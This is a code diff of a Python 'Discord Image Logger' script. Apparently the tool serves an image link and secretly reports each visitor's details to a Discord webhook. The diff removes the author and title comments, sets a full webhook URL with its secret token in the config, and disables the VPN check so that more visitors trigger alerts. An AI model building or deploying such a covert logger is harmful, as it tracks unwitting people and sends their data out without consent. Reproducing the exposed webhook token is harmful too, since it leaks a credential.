@@ -1,6 +1,3 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -11,7 +8,6 @@ __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
-    # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1409921636110434424/jKWIgyZgRyfvjX9WErxhiB9UEhxqroEHb6YSXx0WHjtoIIqtAbivghGlIm59QfenyZk0",
     "image": "https://media.giphy.com/media/v1.Y2lkPTQh1Y1JjA3yW21RewAhxjanvaUoSkVZF3P4am5xcTJkN2wzYjdvOG0weXZoMWU3ZyZlcD12MV9naWZzX3NlYXJjaCZjdD1n/Ju7l5y9osyymQ/giphy.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
@@ -32,7 +28,7 @@ config = {
         "richMessage": False, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 0, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
